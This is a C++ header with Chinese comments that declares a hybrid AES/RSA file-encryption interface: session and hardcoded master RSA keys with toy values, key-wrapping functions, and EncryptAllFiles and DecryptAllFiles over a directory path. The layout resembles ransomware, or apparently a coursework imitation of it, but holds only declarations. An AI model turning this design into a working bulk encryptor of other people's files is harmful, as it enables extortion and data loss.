#pragma once
#ifndef MY_AES_FILE_H
#define MY_AES_FILE_H
#include <string>
using namespace std;

struct pub_key {
	long long pub_key;
	long long n;
};//公钥
struct pri_key {
	long long pri_key;
	long long n;
};//私钥
pub_key session_pub_key;//全局变量随机生成的rsa公钥session_pub_key
pri_key session_pri_key;//全局变量随机生成的rsa私钥session_pri_key

const pub_key master_pub_key = { 5903, 2045206627 };//内置公钥
const pri_key master_pri_key = { 256721999, 2045206627 };//私钥保存在客户端**********************************

extern "C"  //需要调用的C++程序就把声明写到这个extern "C"范围中；
{
void aes(unsigned char* key, string file_sname);
void deaes(pri_key encrypted_aes_key, string file_name, string decrypt_file_name);
void get_session_key(pub_key* session_pub_key, pri_key* session_pri_key);

void rsa(unsigned char* aes_key, pub_key session_pub_key, unsigned char* encrypted_aes_key);
void dersa(unsigned char* encrypted_aes_key, pri_key session_pri_key, unsigned char* aes_key);

void rsa_rsa(pri_key *session_pri_key, pub_key master_pub_key);
void dersa_rsa(pri_key* session_pri_key, pri_key master_pri_key);

void random(unsigned char* key);
void EncryptAllFiles(string path);
void DecryptAllFiles(string path, string fileType);
}
#endif

